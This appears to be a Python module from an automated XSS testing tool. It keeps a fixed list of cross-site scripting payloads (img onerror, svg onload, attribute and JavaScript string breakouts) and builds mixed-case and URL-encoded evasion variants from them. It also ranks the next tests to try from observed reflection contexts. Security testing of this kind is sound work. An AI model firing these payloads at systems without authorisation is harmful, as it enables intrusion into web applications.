"""Bounded XSS hypotheses built from observed inputs and browser feedback.

The specialist chooses a technique and variant. Request bytes, origin, identity,
and the fresh execution nonce remain owned by the scoped tools.
"""

from __future__ import annotations

from urllib.parse import quote


BASE_PAYLOADS = {
    "html_body": '<img src=x onerror=alert("__PROWL_NONCE__")>',
    "html_body_svg": '<svg onload=alert("__PROWL_NONCE__")>',
    "html_attribute": '"><img src=x onerror=alert("__PROWL_NONCE__")>',
    "html_attribute_single": "'><img src=x onerror=alert(\"__PROWL_NONCE__\")>",
    "js_single": "';alert(\"__PROWL_NONCE__\");//",
    "js_double": '\";alert(\'__PROWL_NONCE__\');//',
}
MAX_ATTEMPTS = 8
CONTEXTS = frozenset({"html_text", "html_attribute", "javascript", "css", "url_attribute"})
REPRESENTATIONS = frozenset({
    "plain_text", "literal_markup_text", "percent_encoded_text",
    "script_text", "style_text", "attribute_value", "event_handler_attribute",
    "url_attribute_value",
})


def payload_for(technique: str, variant: str = "base", *, allow_double_url: bool = True) -> str:
    """Generate a small, reviewed payload; never accept model supplied bytes."""
    if not isinstance(technique, str) or technique not in BASE_PAYLOADS:
        raise ValueError("unsupported_technique")
    if not isinstance(variant, str):
        raise ValueError("unsupported_variant")
    if variant == "base":
        return BASE_PAYLOADS[technique]
    if variant == "mixed_case" and technique.startswith("html_"):
        return (BASE_PAYLOADS[technique]
                .replace("<img", "<ImG").replace("<svg", "<SvG")
                .replace("onerror", "oNeRrOr").replace("onload", "oNlOaD"))
    if variant == "url_double" and allow_double_url:
        return quote(BASE_PAYLOADS[technique], safe="")
    raise ValueError("unsupported_variant")


def attempt_key(technique: str, variant: str) -> tuple[str, str]:
    return technique, variant


def xss_trace(cell: dict, proof: dict, *, technique: str, variant: str,
              attempts: list[dict]) -> dict:
    """Give the specialist a compact source-to-render hypothesis and next tests.

    Static JavaScript leads are labeled as leads; DOM appearance is an observed
    render result. Neither is promoted to execution proof.
    """
    contexts = [item for item in (proof.get("reflection_contexts") or [])
                if isinstance(item, str) and item in CONTEXTS][:8]
    observations = [
        {"context": row["context"], "representation": row["representation"]}
        for row in (proof.get("reflection_observations") or [])[:8]
        if isinstance(row, dict) and isinstance(row.get("context"), str)
        and isinstance(row.get("representation"), str)
        and row["context"] in CONTEXTS and row["representation"] in REPRESENTATIONS
    ]
    contexts = list(dict.fromkeys([*contexts, *(row["context"] for row in observations)]))
    static_sources = [str(row.get("kind")) for row in cell.get("source_leads") or []
                      if isinstance(row, dict) and isinstance(row.get("kind"), str)
                      and row["kind"] in {"fragment", "query"}][:4]
    static_transforms = [str(row.get("kind")) for row in cell.get("transform_leads") or []
                         if isinstance(row, dict) and isinstance(row.get("kind"), str)
                         and row["kind"] in
                         {"uri_decode", "base64_decode", "html_parse"}][:4]
    static_sinks = [str(row.get("kind")) for row in cell.get("sink_leads") or []
                    if isinstance(row, dict) and isinstance(row.get("kind"), str)
                    and row["kind"] in
                    {"html_assignment", "dynamic_code"}][:4]
    tested = {attempt_key(str(row.get("technique") or ""),
                          str(row.get("variant") or "base")) for row in attempts
              if isinstance(row, dict)}
    choices: list[tuple[str, str]] = []
    if "html_text" in contexts:
        choices.extend([("html_body_svg", "base"), ("html_body", "mixed_case")])
    if "html_attribute" in contexts:
        choices.extend([("html_attribute", "base"),
                        ("html_attribute_single", "base"),
                        ("html_attribute", "mixed_case")])
    if "javascript" in contexts:
        choices.extend([("js_single", "base"), ("js_double", "base")])
    if not contexts and cell.get("test_type") == "dom_xss":
        if "html_assignment" in static_sinks:
            choices.append(("html_body_svg", "base"))
        if "dynamic_code" in static_sinks:
            choices.extend([("js_single", "base"), ("js_double", "base")])
    if ("uri_decode" in static_transforms
            and any(row["representation"] == "percent_encoded_text" for row in observations)):
        choices.append((technique, "url_double"))
    remaining = max(0, MAX_ATTEMPTS - len(attempts))
    next_tests = [] if proof.get("executed") is True else [
        {"technique": name, "variant": form}
        for name, form in dict.fromkeys(choices)
        if (name, form) not in tested
        and not (form == "url_double" and cell.get("method") == "POST")
    ][:min(2, remaining)]
    source_kind = str(cell.get("parameter") or "").partition(":")[0]
    return {
        "source": {"kind": source_kind, "parameter": str(cell.get("parameter") or ""),
                   "path": str(cell.get("path") or "")},
        "static_source_leads": static_sources,
        "static_transform_leads": static_transforms,
        "static_sink_leads": static_sinks,
        "rendered_contexts": contexts,
        "render_observations": observations,
        "attempt": {"technique": technique, "variant": variant,
                    "executed": proof.get("executed") is True},
        "next_tests": next_tests,
        "remaining_attempts": remaining,
    }
